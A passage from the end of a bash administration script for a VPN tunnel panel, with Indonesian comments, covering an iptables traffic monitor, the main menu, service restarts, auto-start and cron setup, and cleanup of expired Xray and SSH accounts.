        # Tampilkan informasi user



        printf "  ${CYAN}%-12s${NC}: ${WHITE}%s${NC}\n" "${proto^^}" "$uname"



        idx=$((idx+2))



    done







    _box_divider $W



    _box_center $W "${YELLOW}Gunakan 'iptables -L TRAFFIC-IN -n -v' untuk detail${NC}"



    _box_bottom $W



    echo ""







    # Tampilkan summary dari iptables



    echo -e "  ${CYAN}Traffic by Port (IN):${NC}"



    iptables -L TRAFFIC-IN -n -v 2>/dev/null | tail -n +3 | while IFS= read -r line; do



        echo -e "  ${DIM}$line${NC}"



    done



    echo ""



    echo -e "  ${CYAN}Traffic by Port (OUT):${NC}"



    iptables -L TRAFFIC-OUT -n -v 2>/dev/null | tail -n +3 | while IFS= read -r line; do



        echo -e "  ${DIM}$line${NC}"



    done







    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







_traffic_reset() {



    echo -e "  ${YELLOW}Mereset traffic counter...${NC}"



    iptables -Z TRAFFIC-IN 2>/dev/null || true



    iptables -Z TRAFFIC-OUT 2>/dev/null || true



    echo -e "  ${GREEN}✔ Traffic counter direset!${NC}"



    sleep 2



}



main_menu() {



    while true; do



        printf "\r  ${CYAN}⣾${NC} ${WHITE}Loading system info...${NC}   "



        show_system_info



        show_menu



        printf "${YELLOW}${BOLD}➤ ENTER OPTION [0-23] : ${NC}"



        read -r choice







        case $choice in



            1|01) menu_ssh ;;



            2|02) menu_vmess ;;



            3|03) menu_vless ;;



            4|04) menu_trojan ;;



            5|05) _menu_list_all ;;



            6|06) menu_renew ;;



            7|07) cek_expired ;;



            8|08) delete_expired ;;



            9|09) menu_telegram_bot ;;



            10) change_domain ;;



            11) menu_ssl ;;



            12) clear; optimize_vpn; echo -e "  ${GREEN}\u2714 Optimization done!${NC}"; sleep 2 ;;



            13)



                clear; print_menu_header "RESTART ALL SERVICES"



                local ssh_svc_r; ssh_svc_r=$(get_ssh_service_name)



                nginx -t 2>/dev/null && printf "  ${GREEN}\u2714${NC} Nginx config OK\n" || printf "  ${RED}\u2718${NC} Nginx config ERROR\n"



                xray -test -config "$XRAY_CONFIG" 2>/dev/null && printf "  ${GREEN}\u2714${NC} Xray config OK\n" || printf "  ${RED}\u2718${NC} Xray config ERROR\n"



                echo ""



                for svc in xray nginx "$ssh_svc_r" dropbear haproxy udp-custom vpn-keepalive vpn-bot; do



                    systemctl restart "$svc" 2>/dev/null && \
                        printf "  ${GREEN}\u2714${NC} %-20s ${GREEN}Restarted${NC}\n" "$svc" || \
                        printf "  ${RED}\u2718${NC} %-20s ${RED}Failed${NC}\n" "$svc"



                done



                echo ""; sleep 2 ;;



            14) run_speedtest ;;



            15) _menu_backup ;;



            16) _menu_restore ;;



            17) menu_uninstall ;;



            18|99) menu_advanced ;;



            19) show_info_port ;;



            20) manage_zivpn_udp ;;



            21) menu_ordervpn ;;



            22) setup_ddos_protection ;;



            23) traffic_monitor_menu ;;
            24) _health_check ;;



            ping|PING) ping_check ;;



            0|00) clear; echo -e "  ${CYAN}Goodbye! — Youzin Crabz Tunel${NC}"; echo -e "  ${DIM}Ketik 'menu' untuk buka panel lagi.${NC}"; echo ""; return 0 ;;



            help|HELP) _show_help ;;



            *) ;;



        esac



    done



}







#================================================



# ENTRY POINT



#================================================







[[ $EUID -ne 0 ]] && {



    echo -e "${RED}Run as root!${NC}"



    echo "  sudo bash $0"



    exit 1



}







# Deteksi environment di awal



detect_ubuntu_version



detect_container



detect_firewall_backend







[[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)







# ── AUTO-HEAL: jalankan sekali saat start ──



# 1. Fix .bashrc jika ada syntax error



if [[ -f /root/.bashrc ]] && ! bash -n /root/.bashrc 2>/dev/null; then



    # Ada syntax error — bersihkan otomatis



    awk '



        /# VPN Panel Auto-Start/ { skip=1; next }



        skip && /^fi[[:space:]]*$/ { skip=0; next }



        skip { next }



        { print }



    ' /root/.bashrc > /tmp/_brc_heal.tmp 2>/dev/null



    grep -v -E 'tunnel\.sh|VPN_MENU_RUNNING|mesg n 2>/dev/null|# VPN Panel'         /tmp/_brc_heal.tmp > /tmp/_brc_heal2.tmp 2>/dev/null



    mv /tmp/_brc_heal2.tmp /root/.bashrc 2>/dev/null



    # Tulis ulang entry bersih



    if ! grep -q "VPN Panel Auto-Start" /root/.bashrc 2>/dev/null; then



        printf '\n# VPN Panel Auto-Start\n' >> /root/.bashrc



        printf 'if [ -n "$PS1" ] && [ "$EUID" -eq 0 ] && [ -z "$VPN_MENU_RUNNING" ]; then\n' >> /root/.bashrc



        printf '    export VPN_MENU_RUNNING=1\n' >> /root/.bashrc



        printf '    mesg n 2>/dev/null\n' >> /root/.bashrc



        printf '    [ -f /root/tunnel.sh ] && . /root/tunnel.sh\n' >> /root/.bashrc



        printf 'fi\n' >> /root/.bashrc



    fi



fi











# 2. Jika timezone masih UTC dan sudah pernah install (ada domain file),



#    biarkan saja — user sudah pilih saat install. Hanya set NTP jika belum aktif.



timedatectl set-ntp true 2>/dev/null || true



command -v chronyc >/dev/null 2>&1 && systemctl is-active --quiet chrony 2>/dev/null ||     systemctl restart chrony 2>/dev/null || true







# 3. Pasang cron delete_expired jika belum ada



if ! crontab -l 2>/dev/null | grep -q "delete_expired_cron"; then



    (crontab -l 2>/dev/null; echo "0 * * * * bash /root/tunnel.sh delete_expired_cron 2>/dev/null") | crontab - 2>/dev/null



fi







# 4. Deploy web jika index.html belum ada



if [[ -f "$DOMAIN_FILE" && ! -f /var/www/html/index.html ]]; then



    rm -f /var/www/html/index.nginx-debian.html /var/www/html/index.htm 2>/dev/null



    deploy_web_page >/dev/null 2>&1



fi







# CLI argument dispatcher



case "${1:-}" in



    deploy_web|web)



        deploy_web_page



        exit 0 ;;



    delete_expired_cron)



        # Jalankan tanpa UI (dipanggil dari cron)



        AKUN_DIR_TMP="${AKUN_DIR:-/root/akun}"



        XRAY_CONFIG_TMP="${XRAY_CONFIG:-/usr/local/etc/xray/config.json}"



        PUBLIC_HTML_TMP="${PUBLIC_HTML:-/var/www/html}"



        today_ts=$(date +%s)



        count_del=0



        shopt -s nullglob



        for f in "${AKUN_DIR_TMP}"/*.txt; do



            [[ ! -f "$f" ]] && continue



            exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)



            [[ -z "$exp_str" ]] && continue



            exp_str_clean="${exp_str//,/}"



            exp_ts=$(date -d "$exp_str_clean" +%s 2>/dev/null)



            [[ -z "$exp_ts" ]] && continue



            if [[ $exp_ts -lt $today_ts ]]; then



                fname=$(basename "$f" .txt)



                uname="${fname#*-}"



                protocol="${fname%%-*}"



                tmp=$(mktemp)



                jq --arg email "$uname"                    'del(.inbounds[].settings.clients[]? | select(.email == $email))'                    "$XRAY_CONFIG_TMP" > "$tmp" 2>/dev/null &&                    mv "$tmp" "$XRAY_CONFIG_TMP" || rm -f "$tmp"



                [[ "$protocol" == "ssh" ]] && userdel -f "$uname" 2>/dev/null



                rm -f "$f"



                rm -f "${PUBLIC_HTML_TMP}/${fname}.txt"



                rm -f "${PUBLIC_HTML_TMP}/${fname}-clash.yaml"



                ((count_del++))



            fi



        done



        shopt -u nullglob



        if [[ $count_del -gt 0 ]]; then



            chmod 644 "$XRAY_CONFIG_TMP" 2>/dev/null



            xray -test -config "$XRAY_CONFIG_TMP" >/dev/null 2>&1 &&                 systemctl restart xray 2>/dev/null



        fi



        exit 0 ;;



    _gen_status)



        # Generate status.json dari cron (tanpa UI)



        # FIXED: 'local' tidak valid di luar function — gunakan variabel biasa



        _gs_ph="${PUBLIC_HTML:-/var/www/html}"



        _gs_xs=$(systemctl is-active xray 2>/dev/null)



        _gs_ns=$(systemctl is-active nginx 2>/dev/null)



        _gs_hs=$(systemctl is-active haproxy 2>/dev/null)



        _gs_ds=$(systemctl is-active dropbear 2>/dev/null)



        _gs_ss=$(systemctl is-active ssh 2>/dev/null || systemctl is-active sshd 2>/dev/null)



        _gs_us=$(systemctl is-active udp-custom 2>/dev/null)



        printf '{"xray":"%s","nginx":"%s","haproxy":"%s","dropbear":"%s","sshd":"%s","udp-custom":"%s"}\n' \
            "$_gs_xs" "$_gs_ns" "$_gs_hs" "$_gs_ds" "$_gs_ss" "$_gs_us" > "$_gs_ph/status.json" 2>/dev/null



        chmod 644 "$_gs_ph/status.json" 2>/dev/null || true



        exit 0 ;;



    install)



        auto_install



        exit 0 ;;



esac







if [[ ! -f "$DOMAIN_FILE" ]]; then



    auto_install



fi







setup_menu_command







# Jalankan main_menu — setelah exit [0], user tetap di shell (tidak disconnect)



# Cek apakah script di-source atau dijalankan langsung



if [[ "${BASH_SOURCE[0]}" != "${0}" ]]; then



    # Di-source → main_menu return langsung ke shell pemanggil



    main_menu



else



    # Dijalankan langsung (bash tunnel.sh) →



    # Spawn shell baru setelah menu exit agar SSH tidak disconnect



    main_menu



    # Setelah exit menu, buka interactive shell supaya SSH tetap hidup



    if [[ -n "$SSH_CONNECTION" || -n "$SSH_TTY" ]]; then



        exec bash --login



    fi



fi
